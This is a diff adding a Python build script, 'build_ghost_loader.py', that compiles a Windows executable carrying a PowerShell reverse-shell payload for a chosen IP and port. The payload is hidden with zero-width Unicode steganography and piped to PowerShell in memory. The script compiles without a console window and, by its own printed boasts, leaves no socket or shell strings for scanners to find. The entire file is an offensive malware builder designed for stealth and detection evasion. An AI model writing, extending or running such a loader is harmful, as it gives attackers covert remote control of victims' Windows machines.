@@ -1,0 +1,146 @@
+#!/usr/bin/env python3
+"""
+build_ghost_loader.py — Ghost Loader EXE Builder
+22DIV / george wu
+
+Builds an exe that:
+  1. Contains a ghost-encoded PS1 (zero-width Unicode steg) embedded as raw bytes
+  2. At runtime: pipes it to powershell stdin — nothing written to disk
+  3. Strings-dump shows invisible Unicode — no socket/shell strings visible
+
+Usage:
+    python build_ghost_loader.py <ip> <port>
+    python build_ghost_loader.py 192.168.1.92 4443
+
+Output: shell/ghost_loader.exe
+"""
+
+import os
+import sys
+import subprocess
+import tempfile
+
+ROOT        = os.path.dirname(os.path.abspath(__file__))
+SHELL_DIR   = os.path.join(ROOT, "shell")
+GHOST_DIR   = os.path.join(ROOT, "ghost-encoder")
+GHOST_SCRIPT = os.path.join(GHOST_DIR, "ghost_encode.py")
+TEMPLATE    = os.path.join(SHELL_DIR, "ghost_loader_template.c")
+OUTPUT_C    = os.path.join(SHELL_DIR, "ghost_loader_gen.c")
+OUTPUT_EXE  = os.path.join(SHELL_DIR, "ghost_loader.exe")
+
+GREEN  = "\033[92m"
+RED    = "\033[91m"
+AMBER  = "\033[93m"
+CYAN   = "\033[96m"
+DIM    = "\033[2m"
+RST    = "\033[0m"
+BOLD   = "\033[1m"
+
+
+def log(msg, colour=CYAN):
+    print(f"  {colour}[*]{RST} {msg}")
+
+
+def ok(msg):
+    print(f"  {GREEN}[+]{RST} {msg}")
+
+
+def err(msg):
+    print(f"  {RED}[!]{RST} {msg}")
+
+
+def build(ip, port):
+    print(f"\n  {CYAN}{BOLD}═══ GHOST LOADER BUILD — {ip}:{port} ═══{RST}\n")
+
+    # ── Step 1: verify ghost-encoder present ──────────────────────────────
+    if not os.path.exists(GHOST_SCRIPT):
+        err(f"ghost_encode.py not found at: {GHOST_DIR}")
+        err("Clone it:  gh repo clone rainfantry/ghost-encoder")
+        return False
+
+    # ── Step 2: generate ghost PS1 ────────────────────────────────────────
+    ps1_tmp = os.path.join(ROOT, "_ghost_loader_tmp.ps1")
+    log(f"Generating ghost PS1 payload for {ip}:{port}...")
+    env = os.environ.copy()
+    env["PYTHONIOENCODING"] = "utf-8"
+    r = subprocess.run(
+        [sys.executable, GHOST_SCRIPT, "--shell", ip, port, "-o", ps1_tmp],
+        cwd=GHOST_DIR, env=env, capture_output=True, text=True
+    )
+    if not os.path.exists(ps1_tmp):
+        err("ghost_encode.py failed — PS1 not generated")
+        if r.stderr:
+            print(r.stderr)
+        return False
+
+    # ── Step 3: read PS1 as raw UTF-8 bytes ───────────────────────────────
+    with open(ps1_tmp, "rb") as f:
+        payload_bytes = f.read()
+    os.remove(ps1_tmp)
+    ok(f"Payload captured: {len(payload_bytes)} bytes")
+
+    # ── Step 4: format as C byte array ────────────────────────────────────
+    hex_parts = []
+    for i, b in enumerate(payload_bytes):
+        if i % 16 == 0:
+            hex_parts.append("\n    ")
+        hex_parts.append(f"0x{b:02x}, ")
+    hex_array = "".join(hex_parts).strip().rstrip(",")
+
+    # ── Step 5: inject into template ──────────────────────────────────────
+    with open(TEMPLATE, "r", encoding="utf-8") as f:
+        template = f.read()
+
+    c_source = template.replace(
+        "    /* PAYLOAD_BYTES */\n    0x00",
+        f"    /* {len(payload_bytes)} bytes — ghost steg PS1 */\n    {hex_array}"
+    )
+
+    with open(OUTPUT_C, "w", encoding="utf-8") as f:
+        f.write(c_source)
+    log("C source generated with embedded payload")
+
+    # ── Step 6: compile ───────────────────────────────────────────────────
+    log("Compiling ghost_loader.exe...")
+    compile_cmd = [
+        "cl.exe",
+        os.path.basename(OUTPUT_C),
+        f"/Fe:{OUTPUT_EXE}",
+        "/O1", "/GS-", "/utf-8",
+        "/link", "/SUBSYSTEM:WINDOWS"
+    ]
+    result = subprocess.run(
+        compile_cmd, cwd=SHELL_DIR,
+        capture_output=True, text=True
+    )
+
+    # clean up intermediate files
+    for ext in [".obj", "_gen.c"]:
+        f = os.path.join(SHELL_DIR, f"ghost_loader{ext}")
+        if os.path.exists(f):
+            os.remove(f)
+    if os.path.exists(OUTPUT_C):
+        os.remove(OUTPUT_C)
+
+    if result.returncode == 0 and os.path.exists(OUTPUT_EXE):
+        size_kb = os.path.getsize(OUTPUT_EXE) // 1024
+        ok(f"Build successful: ghost_loader.exe ({size_kb} KB)")
+        print(f"\n  {DIM}  Payload: {len(payload_bytes)}B ghost steg PS1 embedded as byte array{RST}")
+        print(f"  {DIM}  Runtime: pipes to powershell stdin — 0 bytes written to disk{RST}")
+        print(f"  {DIM}  Strings: invisible zero-width Unicode — no socket/shell signatures{RST}")
+        print(f"  {DIM}  Target:  {ip}:{port}{RST}\n")
+        return True
+    else:
+        err("Compile failed:")
+        print(result.stdout[-2000:] if result.stdout else "")
+        print(result.stderr[-1000:] if result.stderr else "")
+        return False
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <ip> <port>")
+        print(f"  e.g: {sys.argv[0]} 192.168.1.92 4443")
+        sys.exit(1)
+    ok_flag = build(sys.argv[1], sys.argv[2])
+    sys.exit(0 if ok_flag else 1)
